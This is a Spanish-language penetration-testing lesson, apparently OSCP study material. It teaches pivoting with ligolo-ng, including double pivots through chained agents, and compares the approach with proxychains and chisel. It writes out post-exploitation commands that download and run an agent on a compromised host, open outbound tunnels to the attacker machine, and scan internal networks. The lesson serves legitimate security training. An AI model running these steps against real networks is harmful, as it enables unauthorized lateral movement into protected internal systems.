---
title: Pivoting Avanzado (ligolo-ng, doble pivote)
order: 20
description: Domina ligolo-ng para crear interfaces TUN reales y encadenar doble pivote hacia redes internas sin las limitaciones de proxychains.
---

## Repaso: por qué proxychains se queda corto

La lección [Firewalls, NAT y Tunneling](/cybersec/manual/redes/firewalls-nat-y-tunneling) introduce el concepto de pivoting: usar una máquina comprometida como trampolín para alcanzar redes internas a las que no tienes acceso directo. La solución clásica es un proxy SOCKS (con SSH `-D` o chisel) más `proxychains`.

**Limitaciones reales de proxychains:**

| Problema | Causa | Impacto en OSCP |
|---|---|---|
| Solo TCP connect | SOCKS4/5 no encapsula UDP ni ICMP | `nmap -sU`, `ping`, ninguno funciona |
| Lentísimo con `nmap` | Cada hilo TCP pasa por el proxy en serie | Un escaneo que tarda 2 min tarda 30 min |
| No todas las herramientas lo respetan | Solo intercepta syscalls de `connect()` | Herramientas que usan raw sockets o UDP fallan |
| Latencia por capas | SOCKS encapsula dentro de SSH o similar | Notable en exploits que tienen timeouts ajustados |

> [!NOTE]
> proxychains sigue siendo útil para pivotes rápidos con una sola herramienta. Para escaneos completos de una red interna o ataques que requieren UDP/ICMP, necesitas una solución con interfaz de red real.

## ligolo-ng: pivoting con interfaz TUN

ligolo-ng resuelve todos los problemas anteriores creando una **interfaz de red virtual (TUN)** en tu Kali. Desde el punto de vista del sistema operativo, la red interna del objetivo es accesible como si tu Kali tuviera una segunda NIC física conectada a ella. Cualquier herramienta —`nmap`, `curl`, `msfconsole`, `impacket`— funciona sin proxychains.

### Arquitectura

```text
┌─────────────────────────────────────────────────────────────┐
│  Tu Kali (attacker)                                         │
│                                                             │
│  interfaz ligolo (TUN) ◄──────── proxy (./proxy -selfcert) │
│  172.16.5.0/24 enrutado                                     │
└──────────────────────────────┬──────────────────────────────┘
                               │ TLS tunnel (TCP 11601)
                               │ (agente conecta hacia Kali)
                ┌──────────────▼──────────────┐
                │  Pivot1 (máquina comprometida)│
                │  eth0: 10.10.10.50           │
                │  eth1: 172.16.5.10           │
                │  agent (./agent -connect ...) │
                └──────────────────────────────┘
                               │
                    ┌──────────▼──────────┐
                    │   Red interna B     │
                    │   172.16.5.0/24     │
                    │   (antes inaccesible│
                    │    desde Kali)      │
                    └─────────────────────┘
```

El agente se ejecuta en la máquina comprometida y **llama hacia fuera** (hacia tu Kali), lo que atraviesa firewalls que bloquean conexiones entrantes. Es el mismo principio de reverse shell aplicado al túnel.

### Preparación en Kali (una sola vez por sesión)

```bash
# Crear la interfaz TUN y asignarla a tu usuario
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# Verificar que la interfaz está activa
ip link show ligolo
```

### Arrancar el proxy en Kali

```bash
# Con certificado autofirmado (suficiente para labs)
./proxy -selfcert

# El proxy escucha en 0.0.0.0:11601 por defecto
# Verás: "INFO Interface is now UP"
```

### Transferir y ejecutar el agente en la víctima

```bash
# En Kali: servir el binario del agente
python3 -m http.server 8080

# En la víctima (Linux):
wget http://<IP_Kali>:8080/agent -O /tmp/agent
chmod +x /tmp/agent
./agent -connect <IP_Kali>:11601 -ignore-cert

# En la víctima (Windows, PowerShell):
# agent.exe -connect <IP_Kali>:11601 -ignore-cert
```

> [!TIP]
> ligolo-ng distribuye binarios precompilados para Linux/Windows/macOS en su [repositorio GitHub](https://github.com/nicocha30/ligolo-ng/releases). En un examen, descárgalos previamente a tu máquina.

### Consola interactiva de ligolo-ng

Una vez que el agente conecta, en la consola del proxy:

```bash
# Ver sesiones activas (agentes conectados)
session
# → Selecciona el agente con el número correspondiente

# Ver interfaces de red de la máquina comprometida
ifconfig
# → Identifica la red interna (ej. 172.16.5.0/24 en eth1)

# Iniciar el túnel (el tráfico empieza a fluir por la TUN)
start
```

### Añadir la ruta en Kali

Ahora tienes el túnel activo pero Kali no sabe que debe enviar el tráfico a `172.16.5.0/24` por la interfaz `ligolo`. Añade la ruta estática (consulta [Direccionamiento y Subnetting](/cybersec/manual/redes/direccionamiento-y-subnetting) si tienes dudas con la notación CIDR):

```bash
# Ruta hacia la red interna descubierta con ifconfig
sudo ip route add 172.16.5.0/24 dev ligolo

# Verificar la tabla de rutas
ip route show | grep ligolo
```

A partir de aquí, puedes usar **cualquier herramienta directamente**:

```bash
# nmap completo sin proxychains, con UDP e ICMP
nmap -sC -sV -p- 172.16.5.20
nmap -sU --top-ports 100 172.16.5.20

# ping funciona (ICMP no está bloqueado por el proxy SOCKS)
ping -c 3 172.16.5.20

# impacket, crackmapexec, etc. sin modificaciones
crackmapexec smb 172.16.5.0/24
```

> [!IMPORTANT]
> El comando `start` en la consola ligolo inicia el túnel para la **sesión seleccionada**. Si tienes múltiples agentes, ejecuta `session` primero para asegurarte de que estás operando sobre el agente correcto.

### Ventaja concreta frente a proxychains

```text
proxychains + SOCKS:                    ligolo-ng (TUN):
  nmap → proxychains → SOCKS proxy  →    nmap → ligolo TUN → red interna
  Solo TCP connect                        TCP + UDP + ICMP
  ~30x más lento                          velocidad casi nativa
  Rompe herramientas con raw sockets      Transparente para el SO
  Requiere prepend en cada comando        Ruta de sistema, sin wrappers
```

## Doble pivote: encadenar dos saltos

El doble pivote (o triple, según el escenario) es la situación donde la red objetivo no es alcanzable directamente desde tu primer pivote. Debes encadenar dos agentes/túneles para llegar a la red C desde Kali.

### Escenario típico

```text
Kali          Red A (DMZ)           Red B (interna)       Red C (segmentada)
10.10.10.5    10.10.10.0/24         172.16.5.0/24         192.168.99.0/24

  Kali ──────► Pivot1 ──────────► Pivot2 ──────────────► Target
  10.10.10.5   10.10.10.50         172.16.5.20             192.168.99.10
               172.16.5.10         192.168.99.5
```

- Kali solo tiene acceso directo a la red A (10.10.10.0/24).
- Pivot1 tiene acceso a la red B (172.16.5.0/24).
- Pivot2 tiene acceso a la red C (192.168.99.0/24).
- Kali nunca alcanza la red C directamente.

### Doble pivote con ligolo-ng

ligolo-ng soporta múltiples sesiones simultáneas. La clave está en el **listener**: un listener en el agente de Pivot1 acepta la conexión del agente de Pivot2 y la reenvía al proxy en Kali.

```bash
# === PASO 1: Pivot1 ya conectado a Kali (sesión 1 activa) ===
# En consola ligolo, con sesión 1 seleccionada:
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601

# Esto hace que Pivot1 escuche en su puerto 11601
# y reenvíe las conexiones al proxy de Kali.

# === PASO 2: Ejecutar el agente en Pivot2 ===
# En Pivot2 (alcanzable desde Pivot1):
./agent -connect 172.16.5.10:11601 -ignore-cert
# Pivot2 conecta a Pivot1, que reenvía a Kali

# === PASO 3: En consola ligolo, aparece sesión 2 ===
session       # → seleccionar sesión 2 (Pivot2)
ifconfig      # → ver 192.168.99.0/24 en Pivot2
start         # → iniciar túnel para sesión 2

# === PASO 4: Añadir ruta en Kali ===
sudo ip route add 192.168.99.0/24 dev ligolo
```

> [!TIP]
> Puedes verificar qué listeners tienes activos con `listener_list` en la consola de ligolo-ng. Para eliminar un listener: `listener_stop <id>`.

### Alternativa: chisel encadenado

Para escenarios donde no puedes subir ligolo-ng a Pivot2, puedes encadenar chisel con el proxy SOCKS de ligolo (usando proxychains solo para transferir chisel y arrancarlo). Consulta [SSH y Túneles](/cybersec/manual/redes/ssh-tuneles) para el enfoque con SSH local/remote forwarding como alternativa en entornos con SSH disponible.

```bash
# Con proxychains apuntando al SOCKS de sesión 1 de ligolo
# (ligolo también puede servir como proxy SOCKS con --socks5):
proxychains ./chisel client 172.16.5.20:8888 R:socks

# Esto añade un segundo SOCKS para la red C
# (menos elegante que el doble agente, pero funciona)
```

> [!WARNING]
> El doble pivote encadenado con múltiples herramientas distintas (chisel + proxychains + ligolo) incrementa la complejidad de depuración. Prioriza mantener todo en ligolo-ng con listeners cuando sea posible.

## Práctica

**Ejercicio 1.** ¿Qué ventaja concreta tiene la interfaz TUN de ligolo frente a un proxy SOCKS + proxychains? Da al menos tres diferencias técnicas.

<details>
<summary>Ver solución</summary>

1. **Soporte de protocolos completo**: la interfaz TUN opera a nivel de red (capa 3), por lo que encapsula TCP, UDP e ICMP. Un proxy SOCKS solo soporta TCP connect (SOCKS4) o TCP+UDP limitado (SOCKS5). Esto significa que `nmap -sU`, `ping` y exploits que usan UDP funcionan directamente con ligolo pero no con proxychains.

2. **Transparencia para las herramientas**: con ligolo añades una ruta de sistema (`ip route add`) y cualquier herramienta del SO la usa automáticamente, sin wrappers. Con proxychains debes anteponer `proxychains <comando>` y la herramienta debe usar syscalls interceptables; herramientas con raw sockets o implementación propia de red no funcionan.

3. **Velocidad**: ligolo crea un túnel TLS directo entre el agente y el proxy. proxychains añade una capa de indirección (SOCKS dentro de SSH o chisel) que introduce latencia y overhead por conexión. Un escaneo nmap que tarda 2 minutos puede tardar 30 con proxychains.

</details>

**Ejercicio 2.** Describe paso a paso un escenario de doble pivote para llegar desde tu Kali (10.10.10.5) hasta la red 192.168.99.0/24, pasando por Pivot1 (10.10.10.50 / 172.16.5.10) y Pivot2 (172.16.5.20 / 192.168.99.5). Usa ligolo-ng.

<details>
<summary>Ver solución</summary>

**Diagrama del escenario:**

```text
Kali            Pivot1              Pivot2              Red C
10.10.10.5  ─── 10.10.10.50    ─── 172.16.5.20    ─── 192.168.99.0/24
                172.16.5.10         192.168.99.5
```

**Pasos:**

1. En Kali, preparar la interfaz TUN:
   ```bash
   sudo ip tuntap add user $USER mode tun ligolo
   sudo ip link set ligolo up
   ./proxy -selfcert
   ```

2. Subir y ejecutar el agente en **Pivot1**:
   ```bash
   ./agent -connect 10.10.10.5:11601 -ignore-cert
   ```

3. En consola ligolo: `session` (seleccionar Pivot1) → `start`. Añadir ruta a red B:
   ```bash
   sudo ip route add 172.16.5.0/24 dev ligolo
   ```

4. En consola ligolo (sesión Pivot1 activa), crear listener para recibir el agente de Pivot2:
   ```bash
   listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
   ```

5. Transferir el agente a **Pivot2** (ahora alcanzable desde Kali vía la ruta ligolo) y ejecutarlo:
   ```bash
   # En Pivot2:
   ./agent -connect 172.16.5.10:11601 -ignore-cert
   ```

6. En consola ligolo: aparece nueva sesión → `session` (seleccionar Pivot2) → `ifconfig` (confirmar 192.168.99.0/24) → `start`.

7. Añadir ruta a red C en Kali:
   ```bash
   sudo ip route add 192.168.99.0/24 dev ligolo
   ```

8. Verificar conectividad:
   ```bash
   ping -c 3 192.168.99.5
   nmap -sV 192.168.99.0/24
   ```

</details>

**Ejercicio 3.** ¿Por qué el agente de ligolo-ng conecta **hacia** tu Kali en lugar de que tu Kali conecte hacia el agente?

<details>
<summary>Ver solución</summary>

Porque la máquina comprometida suele estar detrás de un firewall o NAT que **bloquea conexiones entrantes** pero permite conexiones salientes (el patrón típico de cualquier red corporativa o de laboratorio).

Si el proxy de Kali intentara conectarse al agente, el firewall/NAT de la red interna descartaría ese paquete porque no hay una regla que permita conexiones entrantes al puerto donde escucha el agente.

En cambio, si el agente inicia la conexión hacia Kali (conexión saliente desde la red interna), el firewall la ve como tráfico saliente legítimo y la deja pasar. Es exactamente el mismo principio que justifica usar **reverse shells** en lugar de bind shells cuando el objetivo está detrás de un firewall.

</details>

## Recursos

- [ligolo-ng — repositorio oficial](https://github.com/nicocha30/ligolo-ng)
- [chisel — tunneling HTTP/HTTPS](https://github.com/jpillora/chisel)
- [HTB Academy — Pivoting, Tunneling & Port Forwarding](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)
- [HackTricks — Tunneling & Port Forwarding](https://book.hacktricks.wiki)
- [Firewalls, NAT y Tunneling (conceptos base)](/cybersec/manual/redes/firewalls-nat-y-tunneling)
- [SSH y Túneles (alternativas con SSH)](/cybersec/manual/redes/ssh-tuneles)
